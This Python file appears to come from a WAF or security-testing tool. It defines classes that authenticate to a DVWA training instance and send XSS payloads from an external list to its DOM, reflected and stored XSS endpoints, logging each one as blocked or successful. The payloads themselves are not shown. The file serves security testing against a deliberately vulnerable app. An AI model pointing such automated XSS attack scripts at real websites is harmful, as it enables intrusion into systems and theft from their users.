from attacks.baseClass import AttackSession
from pathlib import Path
from utilities.eventHandler import eventHandler

class XSS(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)

    def authentication(self):
        return super().authentication()
    def attack():
        pass
    def startAttack(self):
        xssDOM("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        xssReflect("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        xssStored("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        

class xssDOM(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="XSS DOM")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/xss.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/xss_d/?default="+line.strip()
                try:
                    response = session.get(url)
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","XSS DOM",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","XSS DOM",line.strip())
                except:
                    self.events.sendMessage("Error","XSS DOM","Error on server")
                    
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","XSS DOM","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","XSS DOM","Attack completed")
        self.events.disconnect(self.events.callback,sender="XSS DOM")


class xssReflect(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="XSS Reflect")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/xss.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/xss_r/?name="+line.strip()
                try:
                    response= session.get(url)
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","XSS Reflect",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","XSS Reflect",line.strip())
                except:
                    self.events.sendMessage("Error","XSS Reflect","Error on server")                   
        f.close()

    def startAttack(self):
        self.events.sendMessage("Information","XSS Reflect","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","XSS Reflect","Attack completed")
        self.events.disconnect(self.events.callback,sender="XSS Reflect")


class xssStored(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="XSS Stored")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        url = self.host + "vulnerabilities/xss_s/"
        file_path = (base_path / "../../payloads/xss.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                tempPayload = {
                    "txtName": "alp",
                    "mtxMessage": line.strip(),
                    "btnSign": "Sign+Guestbook"
                }
                try:
                    response = session.post(url,data=tempPayload)
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","XSS Stored",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","XSS Stored",line.strip())
                except:
                    self.events.sendMessage("Error","XSS Stored","Error on server")                   
                    
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","XSS Stored","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","XSS Stored","Attack completed")
        self.events.disconnect(self.events.callback,sender="XSS Stored")